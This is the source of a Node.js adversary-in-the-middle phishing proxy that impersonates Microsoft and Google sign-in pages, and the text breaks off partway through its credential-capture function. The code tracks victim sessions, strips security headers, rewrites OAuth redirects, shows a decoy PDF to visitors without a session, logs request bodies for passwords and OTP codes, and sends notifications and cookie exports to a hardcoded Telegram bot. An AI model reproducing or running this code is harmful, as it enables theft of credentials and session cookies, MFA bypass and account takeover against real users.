const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
const fetch = require('node-fetch');

// === CONFIGURATION CONSTANTS ===
const FALLBACK_PDF_URL = "https://hfs.jhu.edu/pdfs/HFSFormsofPayment.pdf";
let lastClientIP = null;
// OAuth-related constants
const PROXY_ENTRY_POINT_BASE = "/login?method=signin&mode=secure&client_id=";
const CORPORATE_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const PERSONAL_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const GOOGLE_CLIENT_ID = "717762328687-iludtf96g1hinl76e4lc1b9a82g457nn.apps.googleusercontent.com";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};

// Custom redirect URL after successful authentication
const CUSTOM_SUCCESS_REDIRECT = "https://login.microsoftonline.com/common/login"; // Change this to your desired URL
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/sos",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
try {
    if (!fs.existsSync(LOGS_DIRECTORY)) {
        fs.mkdirSync(LOGS_DIRECTORY);
    }
} catch (error) {
    displayError("Directory creation failed", error, LOGS_DIRECTORY);
}
const LOG_FILE_STREAMS = {};
//!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
const VICTIM_SESSIONS = {}

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN_1 = "8068578948:AAGHXDTTkQGhWVbNyt5SXQQiTlyCWKZx7Qo";
const TELEGRAM_CHAT_ID_1 = "6263177378";

function normalizeIP(rawIP) {
  if (!rawIP) return "unknown";
  if (rawIP.includes(",")) rawIP = rawIP.split(",")[0].trim();
  if (rawIP.includes(":")) {
    if (rawIP.includes(".") && rawIP.match(/:\d+$/)) {
      rawIP = rawIP.replace(/:\d+$/, "");
    } else if (rawIP.includes("]")) {
      rawIP = rawIP.split("]")[0].replace("[", "");
    } else if (rawIP.match(/:\d+$/)) {
      rawIP = rawIP.replace(/:\d+$/, "");
    }
  }
  return rawIP;
}

function extractIP(headers, socket) {
  const rawIP =
    headers['cf-connecting-ip'] ||
    headers['x-forwarded-for'] ||
    headers['x-client-ip'] ||
    headers['true-client-ip'] ||
    headers['x-real-ip'] ||
    socket?.remoteAddress ||
    "unknown";

  return normalizeIP(rawIP);
}


const proxyServer = http.createServer(async (clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);
// Usage in your server
const clientIP = extractIP(headers, clientRequest.socket);
lastClientIP = clientIP;
  const userAgent = (headers['user-agent'] || '').toLowerCase();
// Always use full requested URL including query string
let parsedUrl;
try {
    // Always construct a full absolute URL to ensure searchParams works
    const fullUrl = `http://${headers.host}${clientRequest.url}`;
    parsedUrl = new URL(fullUrl);
} catch (err) {
    console.warn("[URL PARSE ERROR] Failed with host-based URL:", err.message);
    try {
        // Fallback: assume localhost to still parse query string
        parsedUrl = new URL(`http://localhost${clientRequest.url}`);
    } catch (err2) {
        console.error("[URL PARSE FATAL] Could not parse request URL at all:", err2.message);
        // Final fallback: default to "/"
        parsedUrl = new URL("http://localhost/");
    }
}


    // Handle short URLs regardless of method
if (url.startsWith("/c") || url.startsWith("/corp") || url.startsWith("/corporate")) {
   
    // ✅ All checks passed → redirect to login
    clientResponse.writeHead(302, {
        Location: `/login?method=signin&mode=secure&client_id=${CORPORATE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`
    });
    return clientResponse.end();
}
    
    if (url === '/p' || url === '/personal') {
        // Redirect to personal login URL
        clientResponse.writeHead(302, { 
            Location: `/login?method=signin&mode=secure&client_id=${PERSONAL_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F` 
        });
        clientResponse.end();
        return;
    }
    
    if (url === '/g' || url === '/google') {
        // Redirect to Google login URL
        clientResponse.writeHead(302, { 
            Location: `/login?method=signin&mode=secure&client_id=${GOOGLE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2F` 
        });
        clientResponse.end();
        return;
    }

    if (url.startsWith(PROXY_ENTRY_POINT_BASE) && url.includes(PHISHED_URL_PARAMETER)) {
        // Check if this is a login URL with any of our supported client_ids
        const isValidLogin = url.includes(`client_id=${CORPORATE_CLIENT_ID}`) || 
                           url.includes(`client_id=${PERSONAL_CLIENT_ID}`) ||
                           url.includes(`client_id=${GOOGLE_CLIENT_ID}`);
        
        if (isValidLogin) {
            try {
                const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
                let session = currentSession;

                if (!currentSession) {
                    const { cookieName, cookieValue } = generateNewSession(phishedURL);
                    clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
                    session = cookieName;
                }
                VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
                VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
                VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
                VICTIM_SESSIONS[session].port = phishedURL.port;
                VICTIM_SESSIONS[session].host = phishedURL.host;

                clientResponse.writeHead(200, { "Content-Type": "text/html" });
                fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
            }
            catch (error) {
                displayError("Phishing URL parsing failed", error, url);
                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
            }
        }
    }

    else if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
            fs.createReadStream(url.slice(1)).pipe(clientResponse);
        }
        else if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            clientResponse.end();
        }

        else {
            let clientRequestBody = [];
            clientRequest
                .on("error", (error) => {
                    displayError("Client request body retrieval failed", error, method, url);
                })
                .on("data", (chunk) => {
                    clientRequestBody.push(chunk);
                })
                .on("end", () => {
                    clientRequestBody = Buffer.concat(clientRequestBody).toString();

                    if (!currentSession) {
                        if (clientRequestBody) {
                            try {
                                clientRequestBody = JSON.parse(clientRequestBody);
                                const proxyRequestURL = new URL(clientRequestBody.url);
                                const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                if (proxyRequestURL.hostname === headers.host &&
                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT_BASE) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    try {
                                        const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                        const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);

                                        VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                        VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                        VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                        VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                        VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                                        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                        clientResponse.end();
                                    }
                                    catch (error) {
                                        displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                    }
                                } else {
    clientResponse.writeHead(200, { "Content-Type": "text/html" });
    clientResponse.end(`<iframe src="${FALLBACK_PDF_URL}" style="width:100%; height:100vh;" frameborder="0"></iframe>`);
 
                                }
                            } catch (error) {
                                displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                            }
                        } else {
    clientResponse.writeHead(200, { "Content-Type": "text/html" });
    clientResponse.end(`<iframe src="${FALLBACK_PDF_URL}" style="width:100%; height:100vh;" frameborder="0"></iframe>`);
 
                        }
                    }

                    else {
                        let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                        const proxyRequestOptions = {
                            hostname: VICTIM_SESSIONS[currentSession].hostname,
                            port: VICTIM_SESSIONS[currentSession].port,
                            method: method,
                            path: VICTIM_SESSIONS[currentSession].path,
                            headers: { ...headers },
                            rejectUnauthorized: false
                        };
                        let isNavigationRequest = false;

                        if (clientRequestBody) {
                            if (url === PROXY_PATHNAMES.jsCookie) {
                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                clientResponse.end(JSON.stringify(validDomains));
                                return;
                            }

                            else if (url === PROXY_PATHNAMES.proxy) {
                                try {
                                    clientRequestBody = JSON.parse(clientRequestBody);
                                    let proxyRequestURL = new URL(clientRequestBody.url);
                                    let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                    if (proxyRequestURL.hostname === headers.host) {
                                        if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT_BASE) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                            try {
                                                const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                                VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                                VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                                VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                                VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                                VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                                clientResponse.end();
                                            }
                                            catch (error) {
                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                            }
                                            return;
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                            fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                            return;
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                            try {
                                                const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                                proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                                proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                                            }
                                            catch (error) {
                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                                return;
                                            }
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
                                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                            clientResponse.end(JSON.stringify(validDomains));
                                            return;
                                        }
                                    }
                                    proxyRequestProtocol = proxyRequestURL.protocol;
                                    proxyRequestOptions.path = proxyRequestPath;
                                    proxyRequestOptions.port = proxyRequestURL.port;
                                    proxyRequestOptions.method = clientRequestBody.method;

                                    proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
                                    if (proxyRequestURL.hostname !== headers.host) {
                                        // Validate hostname before setting
                                        const hostname = proxyRequestURL.hostname;
                                        if (hostname && hostname.length <= 253 && /^[a-zA-Z0-9.-]+$/.test(hostname)) {
                                            proxyRequestOptions.hostname = hostname;
                                            proxyRequestOptions.headers.host = proxyRequestURL.host;
                                        } else {
                                            console.error(`Invalid hostname detected: ${hostname}`);
                                            // Use the original session hostname as fallback
                                            proxyRequestOptions.hostname = VICTIM_SESSIONS[currentSession].hostname;
                                            proxyRequestOptions.headers.host = VICTIM_SESSIONS[currentSession].host;
                                        }
                                    }
                                    if (proxyRequestOptions.headers.referer) {
                                        proxyRequestOptions.headers.referer = clientRequestBody.referrer;
                                    }
                                    isNavigationRequest = clientRequestBody.mode === "navigate";
                                }
                                catch (error) {
                                    displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                                }
                            } else {
                                console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
                            }
                        } else {
                            console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
                        }

                        proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                        updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                        const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                        const requestContentLength = Buffer.byteLength(proxyRequestBody);
                        if (requestContentLength) {
                            proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
                        }
                        else {
                            delete proxyRequestOptions.headers["content-type"];
                            delete proxyRequestOptions.headers["content-length"];
                        }

                        if (isNavigationRequest) {
                            VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                            VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                            VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                            VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                            VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                        }

                        makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
                    }
                });
        }
    }

    else {
        // If someone visits the base URL without a session, show a 404 instead of redirecting to intrinsec
if (url === '/' && !currentSession) {

    // Serve PDF in iframe and stop further processing
    clientResponse.writeHead(200, { "Content-Type": "text/html" });
    clientResponse.end(`<iframe src="${FALLBACK_PDF_URL}" style="width:100%; height:100vh;" frameborder="0"></iframe>`);
    return; // 🚨 STOP here so proxy forwarding doesn't run
} else if (!currentSession) {
            // If no session exists, try to create one for common paths
            if (url.includes('/login') || url.includes('/signin') || url.includes('/oauth')) {
                // Create a default session for Microsoft login attempts
                const defaultUrl = new URL('https://login.live.com/');
                const { cookieName, cookieValue } = generateNewSession(defaultUrl);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
                
                VICTIM_SESSIONS[cookieName].protocol = 'https:';
                VICTIM_SESSIONS[cookieName].hostname = 'login.live.com';
                VICTIM_SESSIONS[cookieName].path = url;
                VICTIM_SESSIONS[cookieName].port = '';
                VICTIM_SESSIONS[cookieName].host = 'login.live.com';
                
                // Serve a simple loading page that will retry the request
                clientResponse.writeHead(200, { "Content-Type": "text/html" });
                clientResponse.end(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Loading...</title>
                        <meta http-equiv="refresh" content="0;url=${url}">
                    </head>
                    <body>
                        <p>Loading...</p>
                        <script>window.location.href = '${url}';</script>
                    </body>
                    </html>
                `);
            } else {
                // Only redirect to intrinsec for truly invalid requests
    clientResponse.writeHead(200, { "Content-Type": "text/html" });
    clientResponse.end(`<iframe src="${FALLBACK_PDF_URL}" style="width:100%; height:100vh;" frameborder="0"></iframe>`);
 
            }
        } else {
    clientResponse.writeHead(200, { "Content-Type": "text/html" });
    clientResponse.end(`<iframe src="${FALLBACK_PDF_URL}" style="width:100%; height:100vh;" frameborder="0"></iframe>`);
 
        }
    }
});
proxyServer.listen(process.env.PORT ?? 3000);


const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
    // Validate hostname before making request
    if (!proxyRequestOptions.hostname || proxyRequestOptions.hostname.length > 253) {
        console.error(`Invalid hostname: ${proxyRequestOptions.hostname}`);
        clientResponse.writeHead(502, { "Content-Type": "text/html" });
        clientResponse.end(`
            <!DOCTYPE html>
            <html>
            <head><title>502 Bad Gateway</title></head>
            <body>
                <h1>502 Bad Gateway</h1>
                <p>Invalid hostname in request.</p>
            </body>
            </html>
        `);
        return;
    }
    
    updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname);

    const protocol = proxyRequestProtocol === "https:" ? https : http;
    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {

        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
            .catch(error => displayError("Log encryption failed", error));

        // Always handle redirects, not just for navigation requests
        if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
            const proxyResponseLocation = proxyResponse.headers.location;
            if (proxyResponseLocation) {
                try {
                    const locationURL = new URL(proxyResponseLocation);
                    
                    // Check if this is a Microsoft OAuth redirect after KMSI
                    if (locationURL.pathname.includes('/oauth2/v2.0/authorize') || 
                        locationURL.pathname.includes('/oauth2/authorize') ||
                        locationURL.pathname.includes('/common/oauth2')) {
                        
                        console.log(`[KMSI REDIRECT INTERCEPTED] Original: ${proxyResponseLocation}`);
                        
                        // Instead of following Microsoft's OAuth redirect, redirect to custom site
                        proxyResponse.headers.location = CUSTOM_SUCCESS_REDIRECT;
                        console.log(`[CUSTOM REDIRECT] Redirecting to: ${CUSTOM_SUCCESS_REDIRECT}`);
                        
                        // Send success notification
                        const sessionData = VICTIM_SESSIONS[currentSession];
                        if (sessionData && !sessionData.successNotificationSent) {
                            const successMessage = `🎉 <b>COMPLETED! FOR 👤<b>Email:</b> ${sessionData.username || 'N/A'}`;
                            sendTelegramNotification(successMessage).catch(error => 
                            console.error('Failed to send success notification:', error)
                            );
                            sessionData.successNotificationSent = true;
                        }
                    } else {
                        // For other redirects, update session information normally
                        VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                        VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                        VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                        VICTIM_SESSIONS[currentSession].port = locationURL.port;
                        // Replace the host in the location header to keep the user on our domain
                        proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
                    }
                } catch {
                    VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
                    if (proxyResponseLocation.startsWith('/')) {
                        proxyResponse.headers.location = `https://${proxyHostname}${proxyResponseLocation}`;
                    }
                }
            }
        }




        else if (proxyResponse.statusCode > 400) {
            displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
        }

        const proxyResponseCookie = proxyResponse.headers["set-cookie"];
        if (proxyResponseCookie) {
            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
        }
        proxyResponse.headers["cache-control"] = "no-store";
        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

        let serverResponseBody = [];
        proxyResponse
            .on("error", (error) => {
                displayError("Server response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path);
            })
            .on("data", (chunk) => {
                serverResponseBody.push(chunk);
            })
            .on("end", async () => {
                serverResponseBody = Buffer.concat(serverResponseBody);

                if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
                    Buffer.byteLength(serverResponseBody)) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateHTMLProxyResponse(decompressedResponseBody);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }
                
                // Handle KMSI (Keep Me Signed In) responses
                else if (proxyRequestOptions.path.includes('/kmsi') || 
                         proxyRequestOptions.path.includes('/KmsiInterrupt') ||
                         proxyRequestOptions.path.includes('/common/SAS/ProcessAuth')) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        let responseBodyString = decompressedResponseBody.toString();
                        
                        // Replace any Microsoft OAuth URLs in the response with our custom redirect
                        responseBodyString = responseBodyString.replace(
                            /https:\/\/[^\/]+\/common\/oauth2\/v2\.0\/authorize[^"'\s]*/g,
                            CUSTOM_SUCCESS_REDIRECT
                        );
                        responseBodyString = responseBodyString.replace(
                            /https:\/\/[^\/]+\/common\/oauth2\/authorize[^"'\s]*/g,
                            CUSTOM_SUCCESS_REDIRECT
                        );
                        
                        serverResponseBody = Buffer.from(responseBodyString);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                        
                        console.log(`[KMSI RESPONSE] Modified OAuth URLs to redirect to: ${CUSTOM_SUCCESS_REDIRECT}`);
                    }
                    catch (error) {
                        displayError("KMSI response body modification failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                    }
                }

                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                clientResponse.end(serverResponseBody);
            });
    });

    if (proxyRequestBody) {
        proxyRequest.write(proxyRequestBody);
    }
    proxyRequest.end();
    proxyRequest.on("error", (error) => {
        console.error(`Proxy request error: ${error.message}`, {
            hostname: proxyRequestOptions.hostname,
            path: proxyRequestOptions.path,
            error: error.code
        });
        
        // Send proper error response to client
        if (!clientResponse.headersSent) {
            clientResponse.writeHead(502, { "Content-Type": "text/html" });
            clientResponse.end(`
                <!DOCTYPE html>
                <html>
                <head><title>502 Bad Gateway</title></head>
                <body>
                    <h1>502 Bad Gateway</h1>
                    <p>The proxy server received an invalid response from an upstream server.</p>
                </body>
                </html>
            `);
        }
    });
}

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name ?? error}`);
    console.error(`Message: ${error.message}`);
    console.error(`Stack trace: ${error.stack}`);

    for (let i = 0; i < args.length; i++) {
        console.error(`Parameter ${i + 1}: ${args[i]}`);
    }
    console.error("******************************");
}

// Telegram notification function
async function sendTelegramNotification(message) {
    const botTokens = [TELEGRAM_BOT_TOKEN_1];
    const chatIds = [TELEGRAM_CHAT_ID_1];
    
    for (let i = 0; i < botTokens.length; i++) {
        const botToken = botTokens[i];
        const chatId = chatIds[i];
        
        try {
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            if (!response.ok) {
                console.error(`Telegram notification failed for bot ${i+1}:`, response.status);
            }
        } catch (error) {
            console.error(`Telegram notification error for bot ${i+1}:`, error);
        }
    }
}

async function sendTelegramDocument(fileContent, fileName, caption = '📄 Cookie Export') {
    const botToken = TELEGRAM_BOT_TOKEN_1;
    const chatId = TELEGRAM_CHAT_ID_1;

    // Generate boundary
    const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';

    // Build raw multipart body
    let body = '';
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    body += `${chatId}\r\n`;

    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
    body += `Content-Type: text/plain\r\n\r\n`;
    body += `${fileContent}\r\n`;

    if (caption) {
        body += `--${boundary}\r\n`;
        body += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
        body += `${caption}\r\n`;
    }
    body += `--${boundary}--\r\n`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: 'POST',
            headers: {
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                'Content-Length': String(Buffer.byteLength(body))
            },
            body: body
        });

        const result = await response.json();
        if (result.ok) {
            console.log('✅ Document sent successfully to Telegram');
        } else {
            console.error('❌ Telegram API error:', result);
        }
    } catch (error) {
        console.error('Failed to send document:', error);
    }
}
function getUserSession(requestCookies) {
    if (!requestCookies) return;

    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");

        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });

    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);

    // Store session info but don't send notification yet
    console.log(`New victim session started: ${cookieName} for ${phishedURL.host}`);
    VICTIM_SESSIONS[cookieName].isPersonal = phishedURL.hostname.includes('live.com') || phishedURL.hostname.includes('outlook.com');
    VICTIM_SESSIONS[cookieName].targetHost = phishedURL.host;

    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);

    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];

        cipher
            .on("error", (error) => {
                reject(error);
            })
            .on("data", (chunk) => {
                encryptedData.push(chunk);
            })
            .on("end", () => {
                resolve({
                    iv: iv.toString("hex"),
                    encryptedData: Buffer.concat(encryptedData).toString("hex")
                });
            });

        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    
    // Check for credentials and OAuth tokens
    const requestBodyStr = proxyRequestBody ? proxyRequestBody.toString() : '';
    const requestPath = proxyRequestOptions.path;
    
    // Debug logging for POST requests to identify fields
    if (proxyRequestOptions.method === 'POST' && requestBodyStr) {
        console.log(`POST to ${requestPath}:`);
        console.log(`Body preview: ${requestBodyStr.substring(0, 200)}...`);
        
        // Log specific fields if found
        if (requestBodyStr.includes('password') || requestBodyStr.includes('passwd')) {
            console.log('>>> PASSWORD FIELD DETECTED IN REQUEST');
        }
        if (requestBodyStr.includes('code') || requestBodyStr.includes('otp')) {
            console.log('>>> CODE/OTP FIELD DETECTED IN REQUEST');
        }
    }
    
    // Check for login credentials - Enhanced to capture all auth methods
    if (requestBodyStr) {
        let username = '';
        let password = '';
        let otcCode = '';
        let mfaMethod = '';
        let recoveryCode = '';
        let authenticatorCode = '';
        
        // Expand endpoint detection to catch all authentication flows
